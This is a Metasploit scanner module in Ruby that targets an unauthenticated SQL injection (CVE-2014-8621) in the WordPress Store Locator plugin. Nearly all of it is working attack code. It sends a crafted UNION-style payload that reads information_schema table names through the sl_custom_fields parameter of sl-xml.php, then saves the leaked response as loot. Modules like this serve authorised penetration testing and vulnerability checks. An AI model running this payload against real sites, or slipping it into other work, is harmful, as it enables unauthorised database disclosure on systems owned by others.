##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Store Locator Unauthenticated SQL Injection Scanner',
      'Description' => %q{
      This module attempts to exploit a SQL injection in Store Locator in version
      2.3-3.11 and likely prior in order if the instance is vulnerable.
      },
      'Author'       =>
        [
          'g0blin', # Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2014-8621'],
          [ 'WPVDB', '8241' ]
        ],
      'DisclosureDate' => 'Nov 05 2014'
    ))
  end

  def check
    check_plugin_version_from_readme('store-locator', '3.12')
  end

  def run_host(ip)
    flag = Rex::Text.rand_text_alpha(5)
    # TODO: Change the SQL injection to greater coverage
    sqli = ", information_schema.tables.table_name as #{flag} FROM wp_store_locator LEFT JOIN information_schema.tables ON 1=1--"
    vprint_status("#{peer} - Checking host")

    res = send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_plugins, 'store-locator', 'sl-xml.php'),
      'vars_get' => {
        'sl_xml_customns[]' => flag,
        'sl_custom_fields'  => sqli
      }
    )

    if res && res.body && res.body.include?('marker')
      print_good("#{peer} - Vulnerable to unauthenticated SQL injection within Store Locator")
      vprint_line("#{res.body}")

      path = store_loot(
        'storelocator.file',
        'text/plain',
        ip,
        res.body
      )
      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Server did not respond in an expected way")
    end
  end
end
